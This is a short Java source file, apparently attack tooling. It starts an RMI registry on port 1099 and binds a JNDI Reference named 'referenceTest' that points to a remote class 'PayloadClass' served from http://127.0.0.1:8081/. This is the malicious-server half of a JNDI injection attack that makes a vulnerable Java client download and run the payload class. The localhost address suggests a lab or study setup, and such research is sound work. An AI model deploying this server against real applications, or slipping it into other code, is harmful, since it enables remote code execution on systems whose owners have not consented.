
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIRegistry {
    public static void main(String[] args) throws RemoteException, NamingException {
        RMIServiceClass rmiServiceClass = new RMIServiceClass();
        Registry registry = LocateRegistry.createRegistry(1099);
        registry.rebind("getRandom",rmiServiceClass);
        Reference reference = new Reference("PayloadClass","PayloadClass","http://127.0.0.1:8081/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.rebind("referenceTest",referenceWrapper);
    }
}
